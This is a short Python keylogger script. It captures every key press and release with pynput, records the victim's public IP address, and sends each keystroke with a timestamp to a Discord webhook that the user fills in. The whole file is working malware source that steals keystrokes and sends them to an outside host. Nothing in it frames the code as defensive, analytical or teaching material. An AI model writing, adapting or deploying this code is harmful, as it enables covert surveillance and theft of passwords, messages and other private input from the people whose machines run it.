from pynput import keyboard
import requests
from datetime import datetime

url = "DISCORD_WEBHOOK" # Insert Discord webhook here
user_ip = requests.get("https://api.ipify.org").text

def press_on_key(key):
    current_time = datetime.now()
    try:
        requests.post(url, json={"content": f"User {user_ip} pressed key: {key.char} at {current_time.strftime('%Y-%m-%d %H:%M:%S')}"})
    except AttributeError:
        requests.post(url, json={"content": f"User {user_ip} pressed bold key {key} at {current_time.strftime('%Y-%m-%d %H:%M:%S')}"})

def release(key):
    current_time = datetime.now()
    requests.post(url, json={"content": f"User {user_ip} released {key} at {current_time.strftime('%Y-%m-%d %H:%M:%S')}"})

with keyboard.Listener(on_press=press_on_key, on_release=release) as listener:
    listener.join()



